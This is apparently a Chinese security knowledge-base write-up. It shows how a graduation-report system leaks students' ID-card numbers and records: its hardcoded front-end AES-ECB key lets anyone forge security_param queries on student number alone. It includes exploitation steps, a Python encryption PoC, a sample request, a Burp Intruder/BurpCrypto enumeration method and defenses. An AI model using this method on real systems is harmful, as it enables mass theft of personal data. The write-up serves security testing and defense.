---
id: web-generic-auth-frontend-aes-ecb-hardcoded-key-student-id-pii-enumeration
title: 前端 AES-ECB 硬编码密钥 + 仅凭学号查询：毕业报告系统批量泄露学生身份证与学籍 PII
type: scenario
domain: web
path: web/generic/auth
technique: frontend-aes-ecb-hardcoded-key-idor-pii-enumeration
tags:
- web
- auth
- idor
- pii
- aes
- ecb
- hardcoded-key
- frontend-encryption
- enumeration
- burpcrypto
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V248
  verified_at: '2026-11-07T13:17:08+08:00'
  notes: 已对照原文与 19 张图核对：crypto.js defaultKey 硬编码、AES/ECB/PKCS7、安全参数 security_param、只传 XH 即返回身份证等 PII、BurpCrypto 批量遍历均与图 12-19 一致；PoC 的 AES-ECB 结构与抓包解密结果一致。未验证点：原文 key/域名已脱敏，未在本机复算目标请求；接口为案例应用自有，无组件 affected_versions。
url: /docs/web/generic/auth/web-generic-auth-frontend-aes-ecb-hardcoded-key-student-id-pii-enumeration/
draft: false
kb_aliases:
- 前端 AES 加密参数越权
- crypto.js 硬编码密钥
- security_param 解密
- 学号查询身份证
- 毕业报告系统 PII 泄露
- BurpCrypto 批量遍历
---

## 一句话结论

当查询接口用前端 AES-ECB（crypto-js、硬编码 key）加密 `security_param`，且后端只按学号 `XH` 查询、不校验身份证后 6 位或调用者归属时，攻击者从 `crypto.js` 提取 key、用 BurpCrypto/脚本加密任意学号，即可批量获取学生姓名、身份证号、班级等 PII，形成全量毕业生信息泄露。

## 原理

- **前端加密只是混淆**：案例的毕业报告页面在点击“立即开启”时，把 `{"XH":"学号","ZJH":"证件号"}` 用 CryptoJS AES 加密后放进 `security_param`。`crypto.js` 中存在硬编码 `defaultKey`，`encryptForBackground` 使用 AES/ECB/PKCS7、UTF-8 key、Base64 输出；密钥随 JS 公开下发，任何访问者都能提取。
- **加密参数可伪造**：拿到 key 后，攻击者可以解密自己的请求，也可以加密任意明文；案例在 Burp Decoder 中解密 `security_param` 得到 `{"XH":"123456","ZJH":"123456"}`，再用同一 key 加密 `{"XH":"202110120235"}`，服务端正常处理。
- **真正的授权缺陷**：接口本应校验“学号 + 身份证后 6 位”或调用者身份，但实际只按 `XH` 查询；案例只传学号（或不匹配的 ZJH）仍返回该学生的完整信息，包括 `SFZJH`/`ZJH`（身份证）、`XM`（姓名）、`XB`、`BIRTHDAY`、`ZYMC`、`XZ`、`PYCC` 等。
- **为什么能批量**：学号通常按年份 + 序号可预测（案例为 21 届毕业生），服务端没有频率限制；用 Burp Intruder 枚举学号、BurpCrypto 处理器自动加密 `security_param`，即可遍历全部学生。
- **根因总结**：前端加密不构成服务端授权；ECB 模式确定性且 key 硬编码，等于把“加密”变成“编码”。真正的修复必须在服务端做对象级授权和二次校验。

## 触发条件

- 查询接口的请求体含前端加密参数（案例为 `security_param`），加密算法/密钥在前端 JS 中可获取。
- 后端仅按学号/工号等可枚举 ID 查询，未校验身份证后 6 位、姓名或其他第二因子，也未绑定当前登录用户/角色。
- 学号格式可预测或有名单来源（毕业年份 + 序号、公开名单等）。
- 接口无频率限制/批量查询限制，响应包含身份证等敏感字段。
- 前端使用 AES-ECB + 固定 key（或有可复现的动态 key），攻击者可离线复现加密。

## 利用步骤

1. 打开 DevTools → Sources，找到 `crypto.js`/业务 chunk，在加密函数或“立即开启”点击处下断点。
2. 触发请求，单步调试确认算法（AES/ECB/PKCS7）、key、明文结构（`{"XH":"...","ZJH":"..."}`）。
3. 用 Burp Decoder/BurpCrypto 或 Python 解密 `security_param`，确认字段含义；用同一 key 加密修改后的明文，验证服务端可解密。
4. 只保留/修改 `XH` 为目标学号，发送请求，观察响应是否返回该学生的身份证、姓名、班级等信息。
5. 用 Burp Intruder 枚举学号（数字/年份+序号），配置 BurpCrypto AES 处理器自动加密 payload，按响应长度/关键字筛选命中。
6. 汇总所有学生记录，评估 PII 规模；如需验证，抽样比对姓名/学号/身份证一致性。

## PoC

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64, json

KEY = b"<hardcoded_key_from_crypto.js>"   # 案例为前端 defaultKey，已脱敏
def enc(obj: dict) -> str:
    pt = json.dumps(obj, separators=(",", ":")).encode()
    ct = AES.new(KEY, AES.MODE_ECB).encrypt(pad(pt, 16))
    return base64.b64encode(ct).decode()

def dec(b64: str) -> dict:
    pt = unpad(AES.new(KEY, AES.MODE_ECB).decrypt(base64.b64decode(b64)), 16)
    return json.loads(pt)

# 解密原始请求
# dec("B1RVj2y7aSYud...") -> {"XH":"123456","ZJH":"123456"}
# 伪造任意学号
payload = enc({"XH": "202110120235"})
```

```http
POST /users/doHttp HTTP/1.1
Host: target
Content-Type: application/json;charset=UTF-8
Cookie: csrftoken=<token>

{
  "url": "http://<internal_host>:<port>/<path>/security",
  "request_type": "POST",
  "params": {
    "security_param": "<Base64(AES-ECB({\"XH\":\"202110120235\"}))>"
  }
}
```

响应中包含学生记录：

```json
{
  "data": [{
    "XH": "2021...",
    "XM": "<name>",
    "XB": "<gender>",
    "BIRTHDAY": "<date>",
    "ZYMC": "<major>",
    "XZ": "<学制>",
    "PYCC": "<层次>",
    "SFZJH": "<id_card>",
    "ZJH": "<id_card>"
  }]
}
```

Burp Intruder + BurpCrypto：AES/ECB/PKCS5Padding、key 为前端 key、输出 Base64，payload 为学号 JSON。

## 变体与关联

- 变体：动态 key 场景可在 DevTools 断点固定 `generateKey()` 返回值，或直接调用页面 `encrypt/decrypt` 函数构造请求；参见 [[code-analysis-reverse-dynamic-key-encrypted-api-idor]]。
- 变体：硬编码 key/IV 还可直接解密前端 JS 中的加密凭据；参见 [[pentest-recon-frontend-js-aes-key-encrypted-credential-mqtt-validation]]。
- 变体：若只签名不加密，还原 `sign` 算法即可；参见 [[web-generic-auth-frontend-js-random-key-fixation-autodecoder]]。
- 变体：学号 → 身份证枚举还可用于默认口令（身份证后 6 位）和账号接管；参见 [[web-generic-auth-miniprogram-bill-hidden-payeridtype-pii]]。
- 关联：[[web-generic-auth-teacher-roster-api-student-token-lesson-enumeration]]（学生/教师接口越权批量拉取学籍）。
- 边界：若服务端校验身份证后 6 位/姓名并与登录用户绑定、或对批量查询限速，单靠前端 key 无法批量；需寻找其他越权点。

## 检测与防御

- **服务端授权**：按学号查询必须绑定当前登录用户/角色/租户；要求并校验第二因子（身份证后 6 位、姓名、验证码），不能只信前端加密。
- **不要用前端加密代替权限**：密钥不应硬编码在 JS；即使使用前端加密，也必须配合服务端会话、签名与对象级授权。
- **限速与审计**：对同一账号/ IP 的学号查询、批量导出、异常大的响应做限速和告警；记录查询对象与调用者。
- **最小化返回**：列表/详情接口只返回必要字段，身份证等敏感字段脱敏或单独授权。
- **检测特征**：同一会话短时间内大量不同 `XH` 的加密请求；`security_param` 解密后仅含学号；响应包含 `SFZJH`/`ZJH`；BurpCrypto/自动化工具特征流量。
